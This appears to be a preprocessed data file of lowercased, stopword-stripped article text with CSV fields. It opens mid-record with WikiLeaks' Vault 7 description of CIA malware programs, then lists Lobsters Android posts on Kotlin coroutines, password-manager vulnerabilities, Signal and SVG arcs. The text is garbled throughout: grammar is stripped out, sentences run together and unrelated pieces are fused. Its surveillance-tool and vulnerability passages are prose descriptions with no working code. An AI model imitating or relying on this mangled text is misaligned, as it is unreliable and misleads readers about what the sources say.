different type covert globespanning force substantial fleet hacker agency hacking division freed disclose often controversial operation nsa primary bureaucratic rival order draw nsa hacking capacity end cia hacking division formally fall agency center cyber intelligence cci registered user produced thousand hacking system trojan virus weaponized malware scale cia undertaking hacker utilized code used run facebook cia created effect nsa even le accountability without publicly answering question whether massive budgetary spend duplicating capacity rival agency could justified statement wikileaks source detail policy question say urgently need debated public including whether cia hacking capability exceed mandated power problem public oversight agency source wish initiate public debate security creation use proliferation democratic control cyberweapons single cyber weapon loose spread around world second used rival state cyber mafia teenage hacker alike julian assange wikileaks editor stated extreme proliferation risk development cyber weapon comparison drawn uncontrolled proliferation weapon result inability contain combined high market value global arm trade significance year zero go well beyond choice cyberwar cyberpeace disclosure also exceptional political legal forensic perspective wikileaks carefully reviewed year zero disclosure published substantive cia documentation avoiding distribution armed cyberweapons consensus emerges technical political nature cia program weapon analyzed disarmed published wikileaks also decided redact anonymise identifying information year zero depth analysis redaction include ten thousand cia target attack machine throughout latin america europe united state aware imperfect result approach chosen remain committed publishing model note quantity published page vault part one year zero already eclipse total number page published first three year edward snowden nsa leak analysis cia malware target iphone android smart tv cia malware hacking tool built edg engineering development group software development group within cci center cyber intelligence department belonging cia ddi directorate digital innovation ddi one five major directorate cia see organizational chart cia detail edg responsible development testing operational support backdoor exploit malicious payload trojan virus kind malware used cia covert operation worldwide increasing sophistication surveillance technique drawn comparison george orwell weeping angel developed cia embedded device branch edb infests smart tv transforming covert microphone surely emblematic realization attack samsung smart tv developed cooperation united kingdom infestation weeping angel place target tv fakeoff mode owner falsely belief tv fakeoff mode tv operates bug recording conversation room sending internet covert cia server october cia also looking infecting vehicle control system used modern car truck purpose control specified would permit cia engage nearly undetectable assassination cia mobile device branch mdb developed numerous attack remotely hack control popular smart phone infected phone instructed send cia user geolocation audio text communication well covertly activate phone camera microphone despite iphone minority share global smart phone market specialized unit cia mobile development branch produce malware infest control exfiltrate data iphones apple product running io ipads cia arsenal includes numerous local remote zero day developed cia obtained gchq nsa fbi purchased cyber arm contractor baitshop disproportionate focus io may explained popularity iphone among social political diplomatic business elite similar unit target google android used run majority world smart phone including samsung htc sony billion android powered phone sold last year year zero show cia weaponized android zero day developed obtained gchq nsa cyber arm contractor technique permit cia bypass encryption whatsapp signal telegram wiebo confide cloackman hacking smart phone run collecting audio message traffic encryption applied cia malware target window osx linux router cia also run substantial effort infect control microsoft window user malware includes multiple local remote weaponized zero day air gap jumping virus hammer drill infects software distributed cddvds infectors removable medium usbs system hide data image covert disk area brutal kangaroo keep malware infestation going many infection effort pulled together cia automated implant branch aib developed several attack system automated infestation control cia malware assassin medusa attack internet infrastructure webservers developed cia network device branch ndb cia developed automated multiplatform malware attack control system covering window mac o x solaris linux edb hive related cutthroat swindle tool described example section cia hoarded vulnerability zero day wake edward snowden leak nsa u technology industry secured commitment obama administration executive would disclose ongoing basis rather hoard serious vulnerability exploit bug zero day apple google microsoft usbased manufacturer serious vulnerability disclosed manufacturer place huge swathe population critical infrastructure risk foreign intelligence cyber criminal independently discover hear rumor vulnerability cia discover vulnerability others u government commitment vulnerability equity process came significant lobbying u technology company risk losing share global market real perceived hidden vulnerability government stated would disclose pervasive vulnerability discovered ongoing basis year zero document show cia breached obama administration commitment many vulnerability used cia cyber arsenal pervasive may already found rival intelligence agency cyber criminal example specific cia malware revealed year zero able penetrate infest control android phone iphone software run run presidential twitter account cia attack software using undisclosed security vulnerability zero day possessed cia cia hack phone everyone else obtained discovered vulnerability long cia keep vulnerability concealed apple google make phone fixed phone remain hackable vulnerability exist population large including u cabinet congress top ceo system administrator security officer engineer hiding security flaw manufacturer like apple google cia ensures hack everyone mdsh expense leaving everyone hackable cyberwar program serious proliferation risk cyber weapon possible keep effective control nuclear proliferation restrained enormous cost visible infrastructure involved assembling enough fissile material produce critical nuclear mass cyber weapon developed hard retain cyber weapon fact computer program pirated like since entirely comprised information copied quickly marginal cost securing weapon particularly difficult since people develop use skill exfiltrate copy without leaving trace sometimes using weapon organization contain substantial price incentive government hacker consultant obtain copy since global vulnerability market pay hundred thousand million dollar copy weapon similarly contractor company obtain weapon sometimes use purpose obtaining advantage competitor selling hacking service last three year united state intelligence sector consists government agency cia nsa contractor booz allan hamilton subject unprecedented series data exfiltrations worker number intelligence community member yet publicly named arrested subject federal criminal investigation separate incident visibly february u federal grand jury indicted harold martin iii count mishandling classified information department justice alleged seized gigabyte information harold martin iii obtained classified program nsa cia including source code numerous hacking tool single cyber weapon loose spread around world second used peer state cyber mafia teenage hacker alike u consulate frankfurt covert cia hacker base addition operation langley virginia cia also us u consulate frankfurt covert base hacker covering europe middle east africa cia hacker operating frankfurt consulate center cyber intelligence europe ccie given diplomatic black passport state department cover instruction incoming cia hacker make germany counterintelligence effort appear inconsequential breeze german custom coverforaction story pat stamp passport cover story trip q supporting technical consultation consulate two earlier wikileaks publication give detail cia approach custom secondary screening procedure frankfurt cia hacker travel without border check european country part shengen open border area including france italy switzerland number cia electronic attack method designed physical proximity attack method able penetrate high security network disconnected internet police record database case cia officer agent allied intelligence officer acting instruction physically infiltrates targeted workplace attacker provided usb containing malware developed cia purpose inserted targeted computer attacker infects exfiltrates data removable medium example cia attack system fine dining provides decoy application cia spy use witness spy appears running program showing video eg vlc presenting slide prezi playing computer game even running fake virus scanner kaspersky mcafee sophos decoy application screen underlaying system automatically infected ransacked cia dramatically increased proliferation risk surely one astounding intelligence goal living memory cia structured classification regime market valuable part vault cia weaponized malware implant zero day listening post lp command control system agency little legal recourse cia made system unclassified cia chose make cyberarsenal unclassified reveals concept developed military use easily crossover battlefield cyber war attack target cia usually requires implant communicate control program internet cia implant command control listening post software classified cia officer could prosecuted dismissed violating rule prohibit placing classified information onto internet consequently cia secretly made cyber spyingwar code unclassified u government able assert copyright either due restriction u constitution mean cyber arm manufacture computer hacker freely pirate weapon obtained cia primarily rely obfuscation protect malware secret conventional weapon missile may fired enemy ie unsecured area proximity impact target detonates ordnance including classified part hence military personnel violate classification rule firing ordnance classified part ordnance likely explode operator intent last decade u hacking operation increasingly dressed military jargon tap department defense funding stream instance attempted malware injection commercial jargon implant drop nsa jargon called fire weapon fired however analogy questionable unlike bullet bomb missile cia malware designed live day even year reached target cia malware explode impact rather permanently infests target order infect target device copy malware must placed target device giving physical possession malware target exfiltrate data back cia await instruction malware must communicate cia command control system placed internet connected server server typically approved hold classified information cia command control system also made unclassified successful attack target computer system like series complex stock maneuver hostile takeover bid careful planting rumor order gain control organization leadership rather firing weapon system military analogy made infestation target perhaps akin execution whole series military maneuver target territory including observation infiltration occupation exploitation evading forensics antivirus series standard lay cia malware infestation pattern likely assist forensic crime scene investigator well apple microsoft google samsung nokia blackberry siemens antivirus company attribute defend attack tradecraft donts contains cia rule malware written avoid fingerprint implicating cia u government witting partner company forensic review similar secret standard cover use encryption hide cia hacker malware communication pdf describing target exfiltrated data pdf well executing payload pdf persisting pdf target machine time cia hacker developed successful attack well known antivirus program documented av defeat personal security product detecting defeating psps pspdebuggerre avoidance example comodo defeated cia malware placing window recycle bin comodo gaping hole doom cia hacker discussed nsa equation group hacker wrong cia malware maker could avoid similar exposure example cia engineering development group edg management system contains around different project documented year zero subprojects malware hacker tool majority project relate tool used penetration infestation implanting control exfiltration another branch development focus development operation listening post lp command control system used communicate control cia implant special project used target specific hardware router smart tv example project described see table content full list project described wikileaks year zero umbrage cia hand crafted hacking technique pose problem agency technique created form fingerprint used forensic investigator attribute multiple different attack entity analogous finding distinctive knife wound multiple separate murder victim unique wounding style creates suspicion single murderer responsible soon one murder set solved murder also find likely attribution cia remote device branch umbrage group collect maintains substantial library attack technique stolen malware produced state including russian federation umbrage related project cia increase total number attack type also misdirect attribution leaving behind fingerprint group attack technique stolen umbrage component cover keyloggers password collection webcam capture data destruction persistence privilege escalation stealth antivirus psp avoidance survey technique fine dining fine dining come standardized questionnaire ie menu cia case officer fill questionnaire used agency osb operational support branch transform request case officer technical requirement hacking attack typically exfiltrating information computer system specific operation questionnaire allows osb identify adapt existing tool operation communicate cia malware configuration staff osb function interface cia operational staff relevant technical support staff among list possible target collection asset liason asset system administrator foreign information operation foreign intelligence agency foreign government entity notably absent reference extremist transnational criminal case officer also asked specify environment target like type computer operating system used internet connectivity installed antivirus utility psps well list file type exfiltrated like office document audio video image custom file type menu also asks information recurring access target possible long unobserved access computer maintained information used cia jqjimprovise software see configure set cia malware suited specific need operation improvise jqjimprovise improvise toolset configuration postprocessing payload setup execution vector selection surveyexfiltration tool supporting major operating system like window bartender macos jukebox linux dancefloor configuration utility like margarita allows noc network operation center customize tool based requirement fine dining questionairies hive hive multiplatform cia malware suite associated control software project provides customizable implant window solaris mikrotik used internet router linux platform listening post lp command control infrastructure communicate implant implant configured communicate via http webserver cover domain operation utilizing implant separate cover domain infrastructure handle number cover domain cover domain resolve ip address located commercial vps virtual private server provider publicfacing server forward incoming traffic via vpn blot server handle actual connection request client setup optional ssl client authentication client sends valid client certificate implant connection forwarded honeycomb toolserver communicates implant valid certificate missing case someone try open cover domain website accident traffic forwarded cover server delivers unsuspicious looking website honeycomb toolserver receives exfiltrated information implant operator also task implant execute job target computer toolserver act command control server implant similar functionality though limited window provided rickbobby project see classified user developer guide hive frequently asked question wikileaks published soon verification analysis ready febuary trump administration issued executive order calling cyberwar review prepared within day review increase timeliness relevance publication play role setting publication date redaction name email address external ip address redacted released page redaction total analysis complete overredaction item may redacted employee contractor target otherwise related agency example author documentation otherwise public project used agency identity v person redacted name replaced user id number allow reader assign multiple page single author given redaction process used single person may represented one assigned identifier identifier refers one real person archive attachment zip targz replaced pdf listing file name archive archive content assessed may made available archive redacted attachment binary content replaced hex dump content prevent accidental invocation binary may infected weaponized cia malware content assessed may made available content redacted ten thousand routable ip address reference including thousand within united state correspond possible target cia covert listening post server intermediary test system redacted exclusive investigation binary file nonpublic origin available dump prevent accidental invocation cia malware infected binary organizational chart organizational chart corresponds material published wikileaks far since organizational structure cia level directorate public placement edg branch within org chart agency reconstructed information contained document released far intended used rough outline internal organization please aware reconstructed org chart incomplete internal reorganization occur frequently wiki page year zero contains web page attachment internal development groupware software used purpose called confluence proprietary software atlassian webpage system like wikipedia version history provide interesting insight document evolved time document include page history latest version order named page within level determined date oldest first page content present originally dynamically created confluence software indicated reconstructed page time period covered year sort order page within level determined date oldest first wikileaks obtained cia creationlast modification date page yet appear technical reason usually date discerned approximated content page order critical know exact timedate contact wikileaks vault vault substantial collection material cia activity obtained wikileaks part vault obtained part one obtained recently cover detail part available time publication part vault different source detail part available time publication total size vault series largest intelligence publication history wikileaks obtain part vault source trust wikileaks reveal information might help identify nt wikileaks worried cia act staff stop series would certainly counterproductive wikileaks already mined best story wikileaks intentionally written hundred impactful story encourage others find create expertise area subsequent part series look demonstrate journalistic excellence may considered early access future part wo nt journalist find best story unlikely considerably story journalist academic position write
287,Lobsters,android,Android,In pursuit of better JVM Futures — Kotlin coroutines,https://medium.com/@zohaibhassan/in-pursuit-of-better-jvm-futures-kotlin-coroutines-281a79211b09,pursuit better jvm future kotlin coroutines,personal opinion building case using android tutorial rxjava otto dreaded land task parallel library new subscribe public void public class implement override public void bolt framework need asyncawait completablefuture implementation vague date kotlin extensive list library read meet coroutines announcement kotlin official documentation kotlin coroutine article library channel select expression documentation pipeline fanout fanin suspend fun select unit actor akka fun commonpool transparent context switching fun val val available wrapping asyncawait support,working c tpl coming back java android web stuff always make hate every bit jvm part opinion jvm way better clr writing part say problem c way thread callback implemented function first class citizen recently although java brings lot table still problem need addressed one future asyncawait promise deferred strongly feel kotlin even infancy pulling expected blog post going reason need better async programming model little bit history kotlin kotlin brings interesting stuff tableall personal opinion way say one promoting one technology however show done wrong past various technology inspiring adding something new paradigmbuilding case using androidi going build case using android typical developer nightmare quoting swing javafx might sound le relevant developer bigger audience working android day tried writing android application back forth transition main thread aka ui thread background thread know gon na go refresher quote tutorial find plethora tutorial technique advocated stackoverflow blog typical scenario kind io compute intensive process launch background thread completing invoke callback method ultimately run rest code ui aka runonuithreadbut wait library write better code scenario library like rxjava otto etc use one may ask well dreaded land uwp universal window platform developed application c might tasted refer simplicity task parallel library make breeze spin large number task controlling one run thread context execution resume obviously learning curve get hold would mentally replace thread task almost everywhere daily routine although android library advocate really good pattern none compare simplicity invoking something like function run background thread return value like normal function callback event tracing stream event tracking nothing dead simple function like invocation simplifies writing code also make debugging easier job rather guessing searching annotation code know invoked code located resume invocation completedlet put way would prefer simple var user await getuserinfo wait use otto use multiple line show part problem somewhere codebus new bus threadenforcermain busregister somewhere else code subscribepublic void onuserinfo user u toastmaketext thisgetusermessage u toastlengthlong show galaxy far far awaypublic class userinfofetcherrunnable implement runnable override public void run code fetching background carry stupid bus around thisbuspost user alone good enough convince problem code hard scattered explain code hard debug quote similar example rxjavaagain get wrong implying possible way otto rxjava stupid duck tape totally valid usage one think top head right providing update ui push event server nt mean perfect every scenario right another option could bolt framework inspires api almost directly c tpl provide continuewith onsuccess onsuccesstask etc still tax callback continuation initializationneed asyncawaitandroid workflow example even language level asynchronous programming construct able multiplex thread pool critical matter http server db engine asynchronous paradigm proved ground timewhile java already support completablefutures luxury asyncawait give certain intuitiveness familiar reason callback hell like nodejs also moving towards asyncawait support python really neat implementation recently c tplmy vague date kotlini tried kotlin twice trying build android app kotlin getting started day enjoyed really small runtime interoperability concise syntax cleaner le ceremonial approach great comprehension android specific ability pas callback like fun onclick listener unit hook without parenthesis like function body viewonclick also allowed simpler data class function extension extensive list library already supporting happy satisfied still looking sort asyncawait support went back routine work using kotlin ever android enthusiast want read use kotlin may good read theremeet coroutines recent announcement kotlin seems like wish almost fulfilled although feature experimental yet see far production ready since able fully express scenario seen practically app development experience try heard new release rewrote service geolocates ip using coroutinesi go tutorial mode coroutines go find every thing need official documentation android people really good kotlin coroutine article library already supporting kotlin coroutines working server code observed thing coroutines feel go beyond usual asyncawait implementation even beyond c syntactic cleanup might also provide powerful way express code complex scenario let go channel select expressionwhile c tpl give fundamental block task inspires many modern async implementation inter task communication addressed really well one might say use bufferblock use technique described like golang erlang channel mailbox first class citizen much cleaner express communication kotlin coroutines take page come builtin channel support documentation let implement complicated pattern like pipeline fanout fanin etc couple channel select expression write complex dispatcher like suspend fun chatmessageprocessor user receivechannel imessage system receivechannel imessage timeout receivechannel imessage select unit usersonreceive value systemonreceive value timeoutonreceive value sound familiar many golang folk jvm land really neat way wait one multiple event act accordingly already see akka fan pulling hair let spin coroutines encapsulate state act message environment example wait message ui update db maybe make api call server another example might publishing chat message coroutines push chat message user chatroom sound familiar moving closer actorsactorsactors object encapsulate state behavior communicate exclusively exchanging message placed recipient mailbox akkakotlin coroutines library come basic actor support awesome part syntactically clean well implement interface define required method ceremonial purpose like go routine erlang process simple function simple look like fun messagedeliveryactor actor chatmessage commonpool stuff like async run requires context keep mind already mature library java provide actor support undermining transparent context switchingso writing server came across typical problem existing package supporting utilizing async apis java nio netty nothing databasereader maxmind library us file object calling operation read file would blocked thread thread pool one solution async implementation always feasible call slacker solution used thread pool kind blocking operation io coroutine bound context way never block request handling thread structure internals lookup class may look like findcontext newfixedthreadpoolcontext suspend private fun find ip string cityinfo run findcontext blocking thread blocking lookup invoking subroutine request really transparent case using jooby support async via deferred code invoking find look like fun getgeoinfo deferred req def launch commonpool val ip reqparam ip value reqip lookupenginefind wo nt use commonpool val info lookupenginefind ip see seamless transition invoke find ip without exposing knowledge using different thread pool invoked coroutine different context getting result back without shenanigan possible due kotlin syntax coroutine implementation show go hand hand provide transparent context switching abstract knowledge away take away coding cost might pay otherwise complete code server available herewrapping upi think stop would let guy try build opinion one might say scala already asyncawait support exciting different kotlin honestly tried scala many time always overwhelmed syntax know many way many thing really want go scala town mixnmatch functional object oriented style happy see emerging syntactically decent clean coroutine implementation kotlin might young surprisingly pleasant stable awesome community bringing always wanted support coroutines jvm
288,Lobsters,android,Android,"xmake v2.1.1 released, support golang, dlang and rust languages",http://www.tboox.org/2017/03/04/update-v2.1.1/,xmake released support golang dlang rust language,,
289,Lobsters,android,Android,Using Kotlin coroutines in Android code,https://medium.com/@macastiblancot/android-coroutines-getting-rid-of-runonuithread-and-callbacks-cleaner-thread-handling-and-more-234c0a9bd8eb,using kotlin coroutines android code,display result request without using runonuithread mainactivitykt launch android launch coroutine androidcontinuation code call service commonpool,display result request without using runonuithreadandroid requires ui updated ui thread main thread app plain android meaning rx libs mean often use runonuithread realize operation background thread want reflect uiwith coroutines context guarantee default everything executed ui thread part coroutine executed background thread let take another look launch android val result sampleclientfetchposts postsadaptersetelements resultawait postsadapternotifydatasetchanged launch launch new coroutine without blocking current thread return reference coroutine job line launching coroutine context android simple implementation coroutinecontext put context provides androidcontinuation continuation made always resume main thread override fun resume value loopermylooper loopergetmainlooper contresume value else handler loopergetmainlooper post contresume value mean coroutine executed android context resumed main thread reason updating notifying adapter require runonuithread displaying toast exception happensif go back check code call service async executed context commonpool context execute resume background shared pool thread
290,Lobsters,android,Android,"Kotlin 1.1 released with JavaScript support, coroutines and more",https://blog.jetbrains.com/kotlin/2017/03/kotlin-1-1/,kotlin released javascript support coroutines,type alias bound callable reference destructuring lambda new coroutines fiber kotlinxcoroutines doc important note optin flag javascript support converter definitelytyped doc tooling first year kotlin adoption community around world introduced kotlin support vertx gradle teamcity kotlinlink pinterest coursera netflix uber square trello basecamp corda kotlin organize kotlin event register event next installation instruction try kotlin online trykotlinlangorg mavengradle intellij idea android studio eclipse marketplace commandline compiler github release page compatibility backwards compatible modulo bug reddit hacker news,today release kotlin big step forward enabling use kotlin many new scenario hope enjoy vision kotlin enable use single expressive performant strongly typed language across component modern application kotlin make two major step towards goal first javascript target longer experimental support kotlin language feature large part standard library well javascript interoperability allows migrate browser frontend application kotlin continuing use modern javascript development framework react second introducing support coroutines lightweight alternative thread coroutines enable much scalable application backends supporting massive workload single jvm instance addition coroutines expressive tool implementing asynchronous behavior important building responsive user interface platform describe two change news added type alias bound callable reference destructuring lambda see detail new page check runnable example coroutines coroutines kotlin make nonblocking asynchronous code straightforward plain synchronous code asynchronous programming taking world thing holding u back nonblocking code add considerable complexity system kotlin offer mean tame complexity making coroutines firstclass citizen language single primitive suspending function function lambda represents computation suspended without blocking thread resumed later technically coroutines lightweight mean cooperative multitasking similar fiber word much better thread almost free start keep around extremely cheap suspend suspension coroutines blocking thread easy compose customize designed coroutines maximum flexibility little fixed language much done library kotlinxcoroutines project feature library top rx completablefuture nio javafx swing similar library written android javascript even many builtin construct available language expressed kotlin library includes generatorsyield python channelsselect go asyncawait c run code background thread pool fun asyncoverlay async commonpool start two async operation val original asyncloadimage original val overlay asyncloadimage overlay apply overlay result applyoverlay originalawait overlayawait launch new coroutine ui context launch ui wait async overlay complete val image asyncoverlay await show ui showimage image read doc important note benefit bring kotlin coroutines fairly new design need extensive battletesting sure right complete release experimental optin flag expect language rule change apis may require adjustment kotlin javascript support mentioned language feature kotlin including coroutines work jvmandroid javascript reflection javascript available looking mean web application written entirely kotlin already experience inside jetbrains publish tutorial material soon kotlin javascript dynamic type interoperate native javascript code use wellknown library typed apis use converter together header definitelytyped support nodejs browser kotlin standard library available use npm read doc tooling kotlin major release kotlin tooling prefer shipping tooling feature affect language soon ready seen many improvement kotlin version highlight kotlin plugins major ides intellij idea android studio eclipse netbeans incremental compilation intellij idea gradle compiler plugins spring jpa mockito making class open generating noarg constructor kapt annotation processing lint support android project numerous ide intention inspection quick fix refactorings code completion improvement keep working make tooling even better deliver update version first year kotlin adoption community short kotlin growing seen people using last year os project github grew line kotlin code slack community grown people numerous meetups user group organized community around world seeing kotlin book online course published kotlin equally strong serverside android developer roughly divide spring framework introduced kotlin support vertx gradle teamcity using kotlin build script project using kotlin found kotlinlink many wellknown company using kotlin pinterest coursera netflix uber square trello basecamp amongst others corda distributed ledger developed consortium wellknown bank goldman sachs well fargo jp morgan deutsche bank ubs hsbc bnp paribas société générale kotlin codebase grateful user contributor advocate part world support important u organize kotlin event kotlin good reason meet local user group friend prepared material help organize event march stream live session featuring kotlin team member plus organizer pack includes swag future feature survey get info register event next make kotlin truly fullstack language going provide tooling language support compiling code multiple platform facilitate sharing module client server keep working improving javascript tooling library support among thing incremental compilation javascript platform work already stay tuned update java coming soon provide support new feature ship expect lot feedback coroutines upcoming month improving area language term performance functionality among priority apart next release mostly focused maintenance performance improvement infrastructure bugfixing p running multiple platform strategic direction kotlin run server desktop android device browser future going compile kotlin native code run many platform including example io embedded device great team jetbrains working project expecting show something interesting fairly soon target particular release yet though installation instruction always try kotlin online trykotlinlangorg mavengradle use version number compiler standard library see doc intellij idea kotlin bundled earlier version install update kotlin plugin version android studio install update plugin plugin manager eclipse install plugin using marketplace commandline compiler downloaded github release page compatibility kotlin language standard library backwards compatible modulo bug something compiled ran keep working aid big team update gradually provide compiler switch disables new feature document covering possible pitfall nice kotlin p see discussion reddit hacker news
291,Lobsters,android,Android,Password-Manager Apps,https://team-sik.org/trent_portfolio/password-manager-apps/,passwordmanager apps,project publication extracting secret vulnerability android password manager slide key doormat design flaw vulnerability android password manager application slide bypassing android password manager apps without root slide,project different policy generation secure password however one biggest challenge memorize complex password password manager application promising way storing sensitive password cryptographically secure accessing password possible user enters secret master password first sight requirement password manager application seem simple storing password user centralized secure confidential way however reality mobile password manger application especially android application vendor advertise password manager application banklevel militarygrade secure however user sure secret actually stored securely despite vendor claim nevertheless possible obtain access stored credential order answer question performed security analysis popular android password manager application google play store based download count overall result extremely worrying revealed password manager application despite claim provide enough protection mechanism stored password credential instead abuse user confidence expose high risk found several implementation flaw resulting serious security vulnerability application stored entered master password plaintext implemented hardcoded crypto key program code consequently attacker easily circumvent crypto algorithm altogether thereby gain access user data case could simply access securely protected passwordscredentials help additional app installed device malicious app extract passwordscredentials plaintext sends attacker yet another case could use socalled data residue attack access master key application case root permission required successful attack gave u access sensitive information aforementioned master password furthermore many apps completely ignore problem clipboard sniffing meaning cleanup clipboard credential copied show even basic function password manager often vulnerable apps also provide additional feature affect security found example autofill function application could abused steal stored secret password manager application using hidden phishing attack better support autofilling password form web page application provide web browser browser additional source vulnerability privacy leakage finding provided detail following update reported vulnerability fixed vendor publication extracting secret vulnerability android password manager stephan huber siegfried rasthofer def con july slide key doormat design flaw vulnerability android password manager application stephan huber siegfried rasthofer steven arzt appseceu may slide bypassing android password manager apps without root stephan huber siegfried rasthofer steven arzt hack box april slide
292,Lobsters,android,Android,Modern Software Development or Slow as Molasses,http://www.richardspindler.com/2017/02/25/modern-software-development-or-slow-as-molasses/,modern software development slow molasses,,looking issue quite always tried play nice quiet quite recently experienced discrepancy going describe quite intimately feel longer hold back let start little introduction motivation topic hand going talking softwaredevelopers mostly general idea probably relevant kind craft handiwork tool use shaping way work also shape result work shape divide time different task shape estimate effort needed finish project shape kind project approach size project approach shape think work world pondering idea getting android app development week put plan action attended android developer meet got started first basic android tutorial tried approach whole endeavor open mind fully expecting first step might bit rocky frustrating unfamiliar ground experienced developer never le helpful support someone meet managed stumble first step foreign field android development bit back story say least developing software quite especially frontend graphical user interface side started delphi pascal moved c used many different user interface library available c like wxwidgets qt year though started prefer rather obscure well known toolkit personal project called fltk fast light toolkit moving professional development recent year though currently working often qt toolkit never le next day android development meet decided give good old fltk another spin see compare learned android day tinker bit environment laptop get started fltk library managed get going typed little hello world style basic program compiled started fired included fltk form designer fluid added button control program suddenly came realize horror experienced day compiling starting basic program based fltk laptop happens instant compiling project happens second barely noticeable starting program laptop window open almost soon press enter key entered name binary console fltk designer fast start instant create form add element etc point waiting involved slowly dawned tried fend thought could help tried hard stay open minded android grumpy old man say olden day everything better tried come several excuse defence course android way capability support different device resolution layout complex rendering pipeline using accelerated graphic display supporting transition animation etc could kid watching ide spinning wheel gradle script looking massive boilerplate generated even simple project waiting designer switch text graphical view taking second waiting felt like age emulator start show result feeble effort even need restart emulator change become apparent updated app restarted took way longer looked case simple fltk project one dominant feeling inside anyone accept kind tool outrage massive timesink large number android developer nobody dare speak sanity development tool start really think maybe many android apps way developer stuck molasses room android development quickly whip crappy little experiment bring live much room radical quick experimentation everything need well thought planned implemented set tool le force developer adhere corporate style slow moving waterfall model development quite simply style development possible even little hello world style android app started fear moment switch designer view android studio would take long enough put flow anger patience probably paper sketching popular app development proliferation mockup tool designer tool specialised towards app development apparently possible think visually sketch android studio designer possible realize design already thought funny enough sometimes use old discontinued ui designer called wxdesigner sketch plan user interface implement framework required job go tool use change way think think confined limited tool like android tool confine way think programmer longer talking solely slowness also complexity environment number concept need understood implement even basic application one source complexity example change various platform version android system way platform implementers choose expose developer change say least reference change android version place documentation everywhere opinion unnecessary noise noise take attention attention limited fact think lead point le necessary full time android developer write apps likely easily possible let say scientist example develop little android app side control lab equipment support little experiment think bad choice developer platform making choice take power away developer bind attention could used elsewhere course could argue give developer job security making system complex understand outsider make hard replace well software used make world interesting necessarily boring feel kind tool give developer feeling cog machine suddenly implementer implementing people idea realizing design people thought longer think problem solve rather creative energy bound problem handling platform becomes purpose go way around suddenly idea problem longer solve implementing app non programmer need programmer possible write simple app still keeping focused actual field expertise anyways wrap little rant think simple thing easy writing simple app simple shortcoming complained fixed possible acceptable situation one popular platform world pain butt develop
293,Lobsters,android,Android,Signal can now be used without Google Play Services,https://github.com/WhisperSystems/Signal-Android/commit/1669731329bcc32c84e33035a67a2fc22444c24b,signal used without google play service,,package orgthoughtcrimesecuresms import androidcontentactivitynotfoundexception import androidcontentcontext import androidcontentdialoginterface import androidcontentintent import androidneturi import androidwidgettoast import comgoogleandroidgmscommonconnectionresult import comgoogleandroidgmscommongoogleapiavailability import comgoogleandroidgmscommongoogleplayservicesutil import import private static final int pickcountry private static final string tag registrationactivityclassgetsimplename private enum playservicesstatus success missing needsupdate transienterror private asyoutypeformatter countryformatter private arrayadapter string countryspinneradapter private spinner countryspinner public void onclick view v return int gcmstatus googleplayservicesutilisgoogleplayservicesavailable self playservicesstatus gcmstatus checkplayservices self gcmstatus connectionresultsuccess googleplayservicesutilisuserrecoverableerror gcmstatus googleplayservicesutilgeterrordialog gcmstatus self show else dialogsshowalertdialog self getstring rstringregistrationactivityunsupported getstring rstringregistrationactivitysorrythisdeviceisnotsupportedfordatamessaging return gcmstatus playservicesstatussuccess promptforregistrationstart self true else gcmstatus playservicesstatusmissing promptfornoplayservices self else gcmstatus playservicesstatusneedsupdate googleapiavailabilitygetinstance geterrordialog self connectionresultserviceversionupdaterequired else dialogsshowalertdialog self getstring rstringregistrationactivityplayserviceserror getstring rstringregistrationactivitygoogleplayservicesisupdatingorunavailable alertdialogbuilder dialog new alertdialogbuilder self private void promptforregistrationstart final context context final string final boolean gcmsupported alertdialogbuilder dialog new alertdialogbuilder context dialogsettitle dialogsetmessage rstringregistrationactivitywewillnowverifythatthefollowingnumberisassociatedwithyourdevices dialogsetpositivebutton getstring rstringregistrationactivitycontinue new dialoginterfaceonclicklistener override public void onclick dialoginterface dialog int intent intent new intent self registrationprogressactivityclass intentputextra intentputextra mastersecret mastersecret intent intent new intent context registrationprogressactivityclass intentputextra registrationprogressactivitynumberextra intentputextra registrationprogressactivitymastersecretextra mastersecret intentputextra registrationprogressactivitygcmsupportedextra gcmsupported startactivity intent finish dialogsetnegativebutton getstring rstringregistrationactivityedit null dialogshow private void promptfornoplayservices final context context final string alertdialogbuilder dialog new alertdialogbuilder context dialogsettitle rstringregistrationactivitymissinggoogleplayservices dialogsetmessage rstringregistrationactivitythisdeviceismissinggoogleplayservices dialogsetpositivebutton rstringregistrationactivityiunderstand new dialoginterfaceonclicklistener override public void onclick dialoginterface dialog int promptforregistrationstart context false dialogsetnegativebutton androidrstringcancel null dialogshow private playservicesstatus checkplayservices context context int gcmstatus try gcmstatus googleapiavailabilitygetinstance isgoogleplayservicesavailable context catch throwable logw tag return playservicesstatusmissing logw tag play service gcmstatus switch gcmstatus case connectionresultsuccess return playservicesstatussuccess case connectionresultserviceversionupdaterequired return playservicesstatusneedsupdate case connectionresultservicedisabled case connectionresultservicemissing case connectionresultserviceinvalid case connectionresultapiunavailable case connectionresultservicemissingpermission return playservicesstatusmissing default return playservicesstatustransienterror private class countrycodechangedlistener implement textwatcher
294,Lobsters,android,Android,Rendering an SVG elliptical arc as bezier curves,https://mortoray.com/2017/02/16/rendering-an-svg-elliptical-arc-as-bezier-curves/,rendering svg elliptical arc bezier curve,smooth sexy curve bezier spline stuffing curve box calculating bound svg arc notation fuse endpoint center point conversion square root arc cosine arc beziers drawing elliptical arc using polylines quadratic cubic curve parametrics paper joe cridge ellipse smooth sexy curve bezier spline fuse follow twitter facebook let know appendix endpoint center arc conversion like,needed draw ellipsis arc vector api complete without though opinion seem differ apple core graphic lack anything axis aligned circular arc android allows ellipse seems also restrict axis aligned mean needed convert ellipse series bezier curve backing apis see also smooth sexy curve bezier spline stuffing curve box calculating bound series svg arc notation svg arc command allows type arc one might want draw since fuse old path control already allowed svg path data seemed logical use definition arc svg specifies arc end point start end combined radius rotation ellipse parameter four potential arc could drawn two atfirstoddlooking flag included select one radiusx radiusy xaxisrotation largearcflag sweepflag x great way specify arc drawing perspective know two point connect know sweep angle want problem good way actually draw arc need converted give u center point range angle drawn endpoint center point conversion svg appendix elliptical arc implementation note conversion endpoint center parametrization algorithm helpful since arc notation bit uncommon hard find algorithm elsewhere got problem however example arc standard actually fail patching required square root first problem square root square root fails produce imaginary number becomes nan given negative value happens whenever input radius large enough connect two end point ellipse even source number consistent floating point precision error result number slightly negative sqrt unforgiving sqrt sqrt nan patched follows spec separate problem case happens given ratio given ratio quite easy scale radius multiply radius reduces value exactly floating point precision notwithstanding resulting full function end article still sqrt max pq due precision pq value could still negative scaling r actually practice slight negative appeared arc cosine algorithm also involves calculating angle two vector though already function calculate decided use equation ensure part worked intended normally worry division prefiltering algorithm ensures nonzero length guarantee operand arccos valid due floating point precision value might slightly 